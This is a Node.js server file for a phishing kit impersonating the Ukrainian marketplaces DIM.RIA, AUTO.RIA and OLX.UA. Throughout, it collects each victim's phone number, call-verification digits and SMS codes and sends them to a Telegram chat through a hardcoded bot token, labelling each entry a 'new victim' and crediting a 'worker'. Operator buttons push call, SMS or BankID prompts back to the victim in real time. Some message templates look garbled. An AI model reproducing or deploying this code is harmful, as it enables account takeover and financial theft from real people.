const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Хранилище сессий и команд
const sessions = {}; // sessionId => { phone, city, project, worker, lastCommand }

app.use(bodyParser.json());
app.use(express.static(__dirname));

const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};

const PROJECT_NAMES = {
    dimria: "DIM.RIA", autoria: "AUTO.RIA", ria: "RIA.COM", olx: "OLX.UA"
};

app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!Object.keys(LOGOS).includes(project)) return res.status(400).send('Bad project');
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const logo = LOGOS[req.query.project] || LOGOS.dimria;
    res.redirect(logo);
});

// Получение команды для сессии
app.get('/api/command/:session', (req, res) => {
    const cmd = sessions[req.params.session]?.pendingCommand || '';
    if (cmd) delete sessions[req.params.session].pendingCommand;
    res.send(cmd);
});

// Логирование данных
app.post('/api/log', (req, res) => {
    const { session, type, phone, digits, code, city, project = 'dimria', worker } = req.body;

    if (!sessions[session]) {
        sessions[session] = { phone: '', city, project, worker };
    }
    Object.assign(sessions[session], req.body);

    let text = '';
    const pn = PROJECT_NAMES[project] || 'DIM.RIA';

    if (type === 'phone') {
        sessions[session].phone = phone;
        text = `*Новая жертва* ⚡\n*Проект:* \( {pn}\n*Номер:* \` \){phone}\`\n*Місто:* ${city}`;
        if (worker) text += `\n*Воркер:* @${worker}`;
    } else if (type === 'call_digits') {
        text = `*Останні 4 цифри дзвінка:* \`\( {digits}\`\n*Номер:* \` \){sessions[session].phone}\``;
    } else if (type === 'sms_code') {
        text = `*SMS-КОД:* \`\( {code}\`\n*Номер:* \` \){sessions[session].phone}\``;
    }

    if (text) sendWithButtons(text, session);

    res.json({ok: true});
});

async function sendWithButtons(text, session) {
    const keyboard = {
        inline_keyboard: [[
            { text: "Звонок", callback_data: `call_${session}` },
            { text: "Код", callback_data: `sms_${session}` },
            { text: "BankID", callback_data: `bankid_${session}` }
        ]]
    };

    await fetch(`${TELEGRAM_API}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: keyboard
        })
    });
}

// Обработка нажатий кнопок
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    res.sendStatus(200);
    const callback = req.body.callback_query;
    if (!callback) return;

    const data = callback.data;
    const [action, session] = data.split('_');

    if (sessions[session]) {
        sessions[session].pendingCommand = action === 'bankid' ? 'bankid' : (action === 'call' ? 'call' : 'sms');
    }

    fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callback.id })
    });
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
